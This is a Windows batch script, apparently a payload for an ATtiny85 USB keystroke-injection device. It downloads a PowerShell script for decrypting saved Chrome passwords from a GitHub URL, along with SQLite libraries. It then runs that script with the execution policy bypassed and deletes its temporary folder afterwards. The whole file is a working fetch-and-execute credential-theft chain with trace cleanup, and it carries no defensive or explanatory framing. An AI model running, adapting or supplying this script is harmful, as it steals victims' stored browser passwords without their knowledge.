@echo off
:: Step 1: Create a temporary directory
set tempDir=%temp%\attiny_package
if not exist %tempDir% mkdir %tempDir%

:: Step 2: Download SQLite DLLs and PowerShell script
echo Downloading necessary files...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mrx-arafat/AtTiny85-Gameplay/main/Decrypt%20Chrome%20Passwords/decrypt_chrome_passwords.ps1' -OutFile '%tempDir%\decrypt_chrome_passwords.ps1'"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/sqlite/sqlite/releases/download/version-3.39.2/sqlite-dll-win64-x64-3390200.zip' -OutFile '%tempDir%\sqlite.zip'"

:: Step 3: Extract SQLite DLLs
powershell -Command "Expand-Archive -Path '%tempDir%\sqlite.zip' -DestinationPath '%tempDir%\sqlite' -Force"

:: Step 4: Execute the PowerShell script with local SQLite DLLs
set PATH=%tempDir%\sqlite;%PATH%
powershell -ExecutionPolicy Bypass -File "%tempDir%\decrypt_chrome_passwords.ps1"

:: Step 5: Cleanup
cd /d %temp%
rd /s /q %tempDir%

:: Step 6: Exit
exit
